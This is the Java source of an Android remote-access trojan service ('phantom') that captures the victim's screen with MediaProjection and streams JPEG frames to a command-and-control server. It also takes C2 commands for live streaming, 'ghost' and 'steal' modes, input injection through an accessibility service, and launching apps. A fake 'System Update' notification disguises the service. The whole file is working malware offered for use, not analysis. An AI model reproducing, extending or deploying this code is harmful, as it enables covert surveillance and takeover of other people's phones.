package com.phantom.remote;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.IBinder;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Android equivalent of the desktop Remote Session module: streams the
 * victim's screen as JPEG frames over the same encrypted C2 channel and
 * forwards input events to {@link RemoteAccessibilityService}.
 *
 * Capture uses MediaProjection + ImageReader (the only supported path on
 * modern Android — /dev/graphics/fb0 is locked down). Input injection goes
 * through the accessibility service because raw /dev/input is root-only.
 *
 * Wire protocol, crypto and HMAC identity are shared with the desktop module
 * via the JNI bridge (native_bridge.cpp -> remote_net.h), so frames land in
 * the same data/remote/ store on the C2 and render in the same UI canvas.
 */
public class RemoteService extends Service {

    public static final String FRAME_PREFIX = "REMOTE_FRAME_B64:";
    private static final String CHANNEL_ID = "phantom_remote";
    private static final int NOTIF_ID = 4;

    private MediaProjection projection;
    private VirtualDisplay vdisplay;
    private ImageReader reader;
    private int width = 720, height = 1280, density = 320;

    private final AtomicBoolean running = new AtomicBoolean(false);
    private volatile boolean streaming = false;
    private volatile int quality = 55;
    private volatile int intervalMs = 3000;
    private volatile int mode = 0;   // 0 interactive, 1 ghost(silent), 2 steal
    private volatile String streamTaskId = "";   // task that started streaming

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIF_ID, buildNotification());

        if (intent != null && intent.hasExtra("data")) {
            int code = intent.getIntExtra("resultCode", 0);
            Intent data = intent.getParcelableExtra("data");
            startCapture(code, data);
        }

        if (!running.getAndSet(true)) {
            new Thread(this::taskLoop, "phantom-c2").start();
        }
        return START_STICKY;
    }

    // ── Capture setup ───────────────────────────────────────────────────────

    private void startCapture(int resultCode, Intent data) {
        try {
            DisplayMetrics dm = new DisplayMetrics();
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            if (wm != null) wm.getDefaultDisplay().getRealMetrics(dm);
            width = dm.widthPixels;
            height = dm.heightPixels;
            density = dm.densityDpi;

            MediaProjectionManager mpm =
                    (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            if (mpm == null) return;
            projection = mpm.getMediaProjection(resultCode, data);
            if (projection == null) return;

            reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            vdisplay = projection.createVirtualDisplay(
                    "phantom-capture", width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    reader.getSurface(), null, null);
        } catch (Throwable t) {
            // capture unavailable -> telemetry/input-only mode
            projection = null;
            reader = null;
        }
    }

    /** Grab the current frame as base64 JPEG, or "" when capture is down. */
    private String captureFrame() {
        if (reader == null) return "";
        Image img = null;
        try {
            img = reader.acquireLatestImage();
            if (img == null) return "";
            Image.Plane plane = img.getPlanes()[0];
            ByteBuffer buf = plane.getBuffer();
            int pixelStride = plane.getPixelStride();
            int rowStride = plane.getRowStride();
            int rowPadding = rowStride - pixelStride * width;

            int bmpW = width + rowPadding / pixelStride;
            Bitmap bmp = Bitmap.createBitmap(bmpW, height, Bitmap.Config.ARGB_8888);
            bmp.copyPixelsFromBuffer(buf);

            Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, width, height);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            cropped.compress(Bitmap.CompressFormat.JPEG, quality, out);
            bmp.recycle();
            cropped.recycle();
            return FRAME_PREFIX + Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
        } catch (Throwable t) {
            return "";
        } finally {
            if (img != null) img.close();
        }
    }

    // ── Task loop (native bridge <-> C2) ────────────────────────────────────

    private void taskLoop() {
        C2Native.checkin();
        long lastStream = 0;
        while (running.get()) {
            try {
                String body = C2Native.poll();
                String[] tasks = C2Native.parseTasks(body);
                for (String t : tasks) {
                    String[] pair = C2Native.taskFields(t);
                    if (pair == null) continue;
                    String out = execute(pair[0], pair[1]);
                    C2Native.sendResult(pair[0], out == null ? "" : out);
                }
                if (streaming && !streamTaskId.isEmpty()
                        && System.currentTimeMillis() - lastStream >= intervalMs) {
                    lastStream = System.currentTimeMillis();
                    String frame = captureFrame();
                    if (!frame.isEmpty()) C2Native.sendStream(streamTaskId, frame);
                }
            } catch (Throwable ignored) {
            }
            try {
                Thread.sleep(streaming ? Math.max(150, intervalMs) : 2000);
            } catch (InterruptedException ignored) {
            }
        }
    }

    private String execute(String taskId, String command) {
        if (command == null) return "";
        String c = command.trim();
        if (c.equals("remote stop")) {
            streaming = false;
            streamTaskId = "";
            return "streaming stopped";
        }
        if (c.startsWith("remote start")) {
            quality = parseQuality(c, 55);
            streaming = true;
            streamTaskId = taskId;
            return "streaming started (quality " + quality + ")";
        }
        if (c.startsWith("remote live")) {
            intervalMs = parseTrailingInt(c, 250);
            quality = parseQuality(c, 45);
            streaming = true;
            streamTaskId = taskId;
            return "live streaming (" + intervalMs + "ms, quality " + quality + ")";
        }
        if (c.startsWith("remote frame")) {
            quality = parseQuality(c, 55);
            String f = captureFrame();
            return f.isEmpty() ? "REMOTE_ERROR: capture unavailable" : f;
        }
        if (c.startsWith("remote mode")) {
            String m = c.substring("remote mode".length()).trim();
            if (m.startsWith("ghost")) { mode = 1; return "mode ghost (silent, no stream)"; }
            if (m.startsWith("steal")) { mode = 2; return "mode steal (active display)"; }
            mode = 0;
            return "mode interactive";
        }
        if (c.startsWith("remote input")) {
            return RemoteAccessibilityService.dispatch(c.substring("remote input".length()).trim());
        }
        if (c.startsWith("remote launch")) {
            return launch(c.substring("remote launch".length()).trim());
        }
        if (c.equals("exit")) {
            running.set(false);
            stopSelf();
            return "exiting";
        }
        return "unknown command: " + c;
    }

    private String launch(String pkg) {
        if (pkg.isEmpty()) return "Usage: remote launch <package>";
        try {
            PackageManager pm = getPackageManager();
            Intent i = pm.getLaunchIntentForPackage(pkg);
            if (i == null) return "package not launchable: " + pkg;
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            return "launched " + pkg;
        } catch (Throwable t) {
            return "launch failed: " + t.getMessage();
        }
    }

    private static int parseQuality(String c, int def) {
        // `remote start 40` / `remote live 250 40`
        String[] parts = c.split("\\s+");
        for (int i = parts.length - 1; i >= 0; i--) {
            try {
                int v = Integer.parseInt(parts[i]);
                if (v >= 10 && v <= 95) return v;
            } catch (NumberFormatException ignored) {
            }
        }
        return def;
    }

    private static int parseTrailingInt(String c, int def) {
        String[] parts = c.split("\\s+");
        for (int i = parts.length - 1; i >= 0; i--) {
            try {
                int v = Integer.parseInt(parts[i]);
                if (v >= 100 && v <= 60000) return v;
            } catch (NumberFormatException ignored) {
            }
        }
        return def;
    }

    // ── Foreground notification ─────────────────────────────────────────────

    private Notification buildNotification() {
        NotificationManager nm =
                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && nm != null) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "System Update",
                    NotificationManager.IMPORTANCE_MIN);
            nm.createNotificationChannel(ch);
        }
        Notification.Builder b = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                ? new Notification.Builder(this, CHANNEL_ID)
                : new Notification.Builder(this);
        return b.setContentTitle("System Update")
                .setContentText("Checking for updates")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setOngoing(true)
                .build();
    }

    @Override
    public void onDestroy() {
        running.set(false);
        if (vdisplay != null) vdisplay.release();
        if (projection != null) projection.stop();
        if (reader != null) reader.close();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
